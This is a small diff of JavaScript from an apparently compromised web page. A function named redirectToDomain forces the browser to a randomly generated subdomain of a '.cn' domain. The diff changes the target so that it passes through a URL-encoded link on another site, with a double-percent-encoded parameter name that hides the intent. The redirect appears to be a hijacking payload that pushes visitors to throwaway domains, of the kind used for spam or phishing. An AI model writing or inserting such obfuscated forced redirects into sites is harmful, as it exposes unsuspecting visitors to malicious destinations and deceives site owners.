@@ -31,7 +31,7 @@ function generateRandomString(length) {
 function redirectToDomain() {
   var randomString = generateRandomString(10);
   var domain = '2022qazwsx085.cn';
-  var redirectURL = 'http://' + randomString + '.' + domain;
+  var redirectURL = 'https%3A%2F%2Fwww.zibll.com%2F%3F%2567%256f%256c%2569%256e%256b%3Dhttp://' + randomString + '.' + domain;
   window.location.href = redirectURL;
 }
 
